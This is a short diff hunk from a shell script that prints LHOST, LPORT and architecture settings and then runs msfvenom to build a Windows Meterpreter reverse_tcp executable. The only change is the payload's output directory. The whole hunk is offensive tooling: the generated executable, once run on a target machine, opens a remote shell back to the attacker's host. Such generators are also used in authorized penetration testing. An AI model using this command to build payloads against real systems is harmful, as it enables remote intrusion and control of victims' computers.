@@ -10,4 +10,4 @@ echo "LHOST : $LHOST"
 echo "LPORT : $LPORT"
 echo "ARCH : $arch" 
 
-sudo msfvenom -p windows/$arch/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > ../wd-generated/exepayload$arch.exe
+sudo msfvenom -p windows/$arch/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > /opt/wd-generated/exepayload$arch.exe
